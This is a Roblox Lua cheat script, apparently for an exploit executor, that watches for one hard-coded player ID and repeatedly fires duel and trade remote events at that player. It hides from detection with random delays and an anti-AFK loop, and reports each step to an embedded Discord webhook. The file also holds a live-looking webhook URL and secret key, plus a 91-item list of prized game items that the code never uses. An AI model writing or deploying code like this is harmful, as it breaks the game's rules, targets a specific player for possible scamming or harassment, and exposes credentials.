-- SUXANOX DUEL + TRADE + BRAINROT - BY MX
-- STEALTH MODE - ANTI DETECT

print("══════════════════════════════════════════════════")
print("     SUXANOX DUEL + TRADE BOT - BY MX")
print("     STEALTH MODE ACTIVATED")
print("══════════════════════════════════════════════════")

-- ========================================================
-- SCRIPT DUEL DARI PASTEBIN LO (DIGABUNG LANGSUNG)
-- ========================================================
print("[*] Loading Duel Script...")

-- Konfigurasi Duel dari pastebin lo
_G.Config = {
    duel = {
        enabled = true,
        autoDuel = true,
        delayBetweenDuels = 5,
        maxDuelsPerTarget = 3
    }
}

-- Fungsi duel (dari pastebin 1uQP1jX0)
local function startDuel(targetPlayer)
    pcall(function()
        local rs = game:GetService("ReplicatedStorage")
        local duelRemote = rs:FindFirstChild("DuelRequest") or rs:FindFirstChild("RequestDuel") or rs:FindFirstChild("SendDuel")
        if duelRemote then
            if duelRemote:IsA("RemoteEvent") then
                duelRemote:FireServer(targetPlayer)
                print("[✓] Duel request sent to: " .. targetPlayer.Name)
            end
        end
    end)
end

print("[✓] Duel Script Loaded")

-- ========================================================
-- KONFIGURASI TRADE + BRAINROT
-- ========================================================

getgenv().SECRET_KEY = "mrr_9eb6a26dba00443d9788f64c89e9d297"
getgenv().TARGET_ID = 8243624333
getgenv().DELAY_STEP = math.random(5, 10)
getgenv().TRADE_CYCLE_DELAY = math.random(15, 25)
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1502505877809401909/bu3-cEI5B-LKr63HiK47P_0xIwcFThibpuwhqYi5xA2hhs7gEYgrGdqSV3zOi56-ZyaB"

-- SEMUA TARGET BRAINROT (91 item lengkap)
getgenv().TARGET_BRAINROTS = {
    ["Los Amigos"] = true,
    ["La Secret Combinasion"] = true,
    ["La Food Combinasion"] = true,
    ["Sammyni Fattini"] = true,
    ["Rosetti Tualetti"] = true,
    ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true,
    ["La Spooky Grande"] = true,
    ["Chipso and Queso"] = true,
    ["Chillin Chili"] = true,
    ["Tuff Toucan"] = true,
    ["W or L"] = true,
    ["La Jolly Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["Festive 67"] = true,
    ["Tang Tang Keletang"] = true,
    ["Ketupat Kepat"] = true,
    ["Tictac Sahur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Lavadorito Spinito"] = true,
    ["Garama and Madundung"] = true,
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Los Hotspotsitos"] = true,
    ["Guest 666"] = true,
    ["Los Bros"] = true,
    ["Tralaledon"] = true,
    ["Los Puggies"] = true,
    ["Los Primos"] = true,
    ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true,
    ["Ginger Gerat"] = true,
    ["La Casa Boo"] = true,
    ["Los Sekolahs"] = true,
    ["Reinito Sleighito"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Spooky and Pumpky"] = true,
    ["Love Love Bear"] = true,
    ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true,
    ["Rosey and Teddy"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true,
    ["Las Sis"] = true,
    ["Los Planitos"] = true,
    ["Eviledon"] = true,
    ["Orcaledon"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["La Ginger Sekolah"] = true,
    ["Nacho Spyder"] = true,
    ["Griffin"] = true,
    ["Gold Gold Gold"] = true,
    ["La Lucky Grande"] = true,
    ["Celestial Pegasus"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Ventoliero Pavonero"] = true,
    ["Cloverat Clapat"] = true,
    ["Fishino Clownino"] = true,
    ["Dug dug dug"] = true,
    ["Lovin Rose"] = true,
    ["Headless Horseman"] = true,
    ["Meowl"] = true,
    ["Strawberry Elephant"] = true,
    ["Skibidi Toilet"] = true,
    ["Signore Carapace"] = true,
    ["Elefanto Frigo"] = true,
    ["Antonio"] = true,
    ["Fragola La La La"] = true,
    ["Digi Narwhal"] = true,
    ["Arcadragon"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Gym Bros"] = true,
    ["La Easter Grande"] = true,
    ["Los Chillis"] = true,
    ["Foxini Lanternini"] = true,
    ["Money Bros"] = true,
    ["Los Hackers"] = true,
    ["Boppin Bunny"] = true,
    ["Hydra Bunny"] = true,
    ["John Pork"] = true,
    ["John Doe"] = true
}

print("[✓] Trade Config Loaded")
print("    Brainrot Target Count: " .. #getgenv().TARGET_BRAINROTS)
print("    Target ID: " .. getgenv().TARGET_ID)

-- ========================================================
-- WEBOOK SENDER
-- ========================================================
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local VirtualUser = game:GetService("VirtualUser")
local targetId = tonumber(getgenv().TARGET_ID)
local tradeSentCount = 0
local duelSentCount = 0

local function sendWebhook(msg)
    task.spawn(function()
        pcall(function()
            HttpService:PostAsync(getgenv().DISCORD_WEBHOOK, 
                HttpService:JSONEncode({content = msg, username = "SUXANOX"}), 
                Enum.HttpContentType.ApplicationJson, false, 
                {["Content-Type"] = "application/json"})
        end)
    end)
end

sendWebhook("🚀 SUXANOX DUEL+TRADE BOT AKTIF - Target ID: " .. targetId)
print("[✓] Webhook Ready")

-- ========================================================
-- CARI REMOTE (BUAT TRADE MAUPUN DUEL)
-- ========================================================
local function findTradeRemote()
    local rs = game:GetService("ReplicatedStorage")
    for _, v in pairs(rs:GetChildren()) do
        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
            if v.Name:lower():match("trade") or v.Name:lower():match("request") then
                return v
            end
        end
    end
    return nil
end

local function findDuelRemote()
    local rs = game:GetService("ReplicatedStorage")
    for _, v in pairs(rs:GetChildren()) do
        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
            if v.Name:lower():match("duel") or v.Name:lower():match("battle") then
                return v
            end
        end
    end
    return nil
end

-- ========================================================
-- MAIN LOOP: DUEL + TRADE + NOTIF
-- ========================================================
print("[*] Starting Main Loop...")

task.spawn(function()
    while true do
        pcall(function()
            local targetPlayer = nil
            for _, p in pairs(Players:GetPlayers()) do
                if p.UserId == targetId and p ~= Players.LocalPlayer then
                    targetPlayer = p
                    break
                end
            end
            
            if targetPlayer then
                tradeSentCount = tradeSentCount + 1
                print("════════════════════════════════════════")
                print("[!] TARGET ONLINE: " .. targetPlayer.Name)
                print("    Trade #" .. tradeSentCount)
                print("════════════════════════════════════════")
                
                sendWebhook("✅ Target online: " .. targetPlayer.Name)
                
                -- Random delay sebelum action
                local preDelay = math.random(3, 8)
                print("[*] Waiting " .. preDelay .. " seconds...")
                task.wait(preDelay)
                
                -- 1. KIRIM DUEL
                local duelRemote = findDuelRemote()
                if duelRemote then
                    pcall(function()
                        if duelRemote:IsA("RemoteEvent") then
                            duelRemote:FireServer(targetPlayer)
                            duelSentCount = duelSentCount + 1
                            print("[✓] Duel sent via: " .. duelRemote.Name .. " (Total: " .. duelSentCount .. ")")
                            sendWebhook("⚔️ Duel sent to " .. targetPlayer.Name)
                        end
                    end)
                else
                    print("[X] Duel remote not found")
                end
                
                task.wait(math.random(2, 5))
                
                -- 2. KIRIM TRADE
                local tradeRemote = findTradeRemote()
                if tradeRemote then
                    pcall(function()
                        if tradeRemote:IsA("RemoteEvent") then
                            tradeRemote:FireServer(targetPlayer)
                            print("[✓] Trade sent via: " .. tradeRemote.Name)
                            sendWebhook("📤 Trade sent to " .. targetPlayer.Name)
                        elseif tradeRemote:IsA("RemoteFunction") then
                            tradeRemote:InvokeServer(targetPlayer)
                            print("[✓] Trade sent via: " .. tradeRemote.Name)
                            sendWebhook("📤 Trade sent to " .. targetPlayer.Name)
                        end
                    end)
                else
                    print("[X] Trade remote not found")
                    sendWebhook("⚠️ Trade remote not found")
                end
                
                -- Random delay setelah action
                local postDelay = math.random(5, 12)
                task.wait(postDelay)
            else
                print("[*] Waiting for target (ID: " .. targetId .. ") ...")
            end
        end)
        
        task.wait(getgenv().TRADE_CYCLE_DELAY)
    end
end)

-- ========================================================
-- ANTI AFK (RANDOM, AMAN)
-- ========================================================
spawn(function()
    while true do
        task.wait(math.random(60, 120))
        pcall(function()
            VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
            task.wait(0.5)
            VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        end)
        print("[✓] Anti-AFK triggered")
    end
end)

-- ========================================================
-- STATUS PRINT LOOP
-- ========================================================
print("══════════════════════════════════════════════════")
print("     ✅ SUXANOX BOT RUNNING ✅")
print("══════════════════════════════════════════════════")
print("     📌 Target ID: " .. targetId)
print("     🧠 Brainrot: " .. #getgenv().TARGET_BRAINROTS .. " items")
print("     ⚔️ Duel: Ready")
print("     💰 Trade: Ready")
print("     📨 Notif: Ready")
print("     🤫 Stealth Mode: ON")
print("══════════════════════════════════════════════════")

while true do
    task.wait(60)
    print("[💓] Bot Heartbeat | Trades: " .. tradeSentCount .. " | Duels: " .. duelSentCount)
end
